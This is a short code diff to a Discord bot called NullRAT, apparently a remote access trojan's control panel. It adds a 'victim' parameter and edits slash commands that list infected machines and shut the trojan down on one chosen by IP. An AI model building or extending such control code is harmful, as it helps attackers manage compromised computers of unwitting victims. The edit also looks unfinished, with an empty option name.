@@ -80,6 +80,7 @@ class NullBot(commands.InteractionBot):
         self.ip_addr = ip_addr
         self.nr_working = nr_working
         self.original_dir = original_dir
+        self.victim = discord.Option("victim", description="Type the identifier of the victim here", required=True)
     
     genEmbed = genEmbed
     checked_embeds = checked_embeds
@@ -116,7 +117,11 @@ async def listvictims(ctx):
     )
     await ctx.response.send_message("Checking all available victims...")
 
-@client.slash_command(description="Quits NullRAT from specified IP")
+@client.slash_command(
+    description="Quits NullRAT from specified IP",
+    options = [
+        discord.Option("")
+    ])
 async def close(ctx, victim):
     if str(victim) == str(ip_addr):
         await ctx.response.send_message(embed=EmbedGen("Information", "Given IP is " + IP(), "Closing NullRAT..."))
